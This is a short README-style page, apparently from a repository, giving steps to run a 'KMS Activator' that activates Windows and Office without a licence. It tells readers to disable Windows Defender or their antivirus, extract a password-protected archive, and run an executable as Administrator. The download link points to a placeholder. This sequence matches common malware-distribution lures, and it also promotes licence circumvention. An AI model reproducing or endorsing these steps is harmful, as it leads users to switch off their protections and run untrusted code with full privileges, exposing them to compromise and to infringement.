# How to use KMS Activator

1. **Disable Windows Defender or antivirus (temporarily)**  
   Windows Defender or your antivirus may block the activator. Disable real-time protection temporarily.

2. **Extract the archive using WinRAR or 7-Zip**  
   Right-click the archive → Extract to folder  
   **Password:** `2026`
   
   [![Download Button](https://img.shields.io/badge/Download-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://google.com)

3. **Run `KMSAPP_activ_v9.19.13.exe` as Administrator**  
   Right-click on `KMSAPP_activ_v9.19.13.exe` → Run as Administrator

4. **Click Activate Windows or Activate Office**  
   Choose the product you want to activate and click the corresponding button

5. **Wait for completion and restart your PC**  
   The activation process takes 10-30 seconds. After completion, restart your computer.

> **Important notes:**
> * Re-enable Windows Defender/antivirus after activation
> * The activator works for Windows 10, 11 and Office 2010-2021
> * If the activation fails, try restarting the program
